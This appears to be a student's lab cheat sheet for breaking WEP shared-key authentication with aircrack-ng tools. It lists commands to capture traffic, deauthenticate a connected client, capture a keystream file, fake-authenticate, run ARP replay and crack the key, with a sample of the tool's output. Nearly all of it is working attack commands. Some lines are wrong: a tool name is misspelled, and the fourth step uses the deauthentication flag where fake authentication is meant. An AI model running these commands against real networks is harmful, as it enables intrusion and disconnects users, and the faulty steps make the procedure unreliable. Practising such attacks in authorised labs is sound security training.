# Is ENC WEP? yes
# Is CIPHER WEP? yes
# Is AUTH ska shared key auth? yes
# clients? 
# strong AP connect? 
# data packets in airodump output? 
# lab guide page 265

###############################################
# Wep: bypass wep ska w/ client (sharedkey)   #
# - shared key                                #
# https://www.aircrack-ng.org/doku.php?id=shared_key #
###############################################
# STEP 1:
airodump-ng -c 8 --bssid 4C:60:DE:4A:62:80 -w ska mon0
# STEP 2: fake auth to confirm sharedkey as open auth is not supported
aireplay-ng -1 0 -e hostileNetwork2g -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
    # root@bt:~# aireplay-ng -1 0 -e hostileNetwork2g -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
    # 15:43:15  Waiting for beacon frame (BSSID: 4C:60:DE:4A:62:80) on channel 8
    # 15:43:15  Sending Authentication Request (Open System) [ACK]
    # 15:43:15  Switching to shared key authentication
# STEP 3: dauth a connected client to disaply SKA in airodump and capture prga file as *.xor
aireplay-ng -0 1 -a 4C:60:DE:4A:62:80  -c 48:51:B7:DB:90:DE mon0
    # if you see broken ska aircrack is outdated or router firmware adds extra fields in prga which breaks
    # look for [ 151 bytes keystream: 4C:60:DE:4A:62:80
# STEP 4: fake auth with prga captured xor file
aireplay-ng -0 1 -a 4C:60:DE:4A:62:80  -c 48:51:B7:DB:90:DE mon0 -y ska-01-4C-60-DE-4A-62-80.xor
# STEP 5: arp replay
aireply-ng -3 -b <ap_mac> -h <our_mac> mon0
# STEP 6: deauth client
aireplay-ng -0 1 -a <ap_mac> -c <victum_mac> mon0
#step 7: wait for high #data/iv count crack key
aircrack-ng -0 -z -n 64 <file.cap>
